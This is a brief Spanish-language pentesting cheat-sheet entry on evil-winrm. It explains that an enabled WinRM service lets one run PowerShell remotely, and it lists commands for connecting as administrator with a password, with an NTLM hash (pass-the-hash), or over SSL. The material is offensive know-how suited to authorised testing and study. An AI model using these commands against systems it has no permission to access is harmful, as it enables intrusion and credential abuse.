Si el winrm esta habilitado podremos conectarnos a la maquina y ejecutar comandos de power shell en ella, evil-winrm nos permite hacer CTRL+L 

```
### **Con Evil-WinRM (HERRAMIENTA DE PENTESTING):**

bash

# Conectar con credenciales
evil-winrm -i 192.168.1.100 -u administrator -p Password123

# Con hash NTLM
evil-winrm -i 192.168.1.100 -u administrator -H NTLM_HASH

# Con certificados (si están configurados)
evil-winrm -i 192.168.1.100 -u administrator -p Password123 -S

```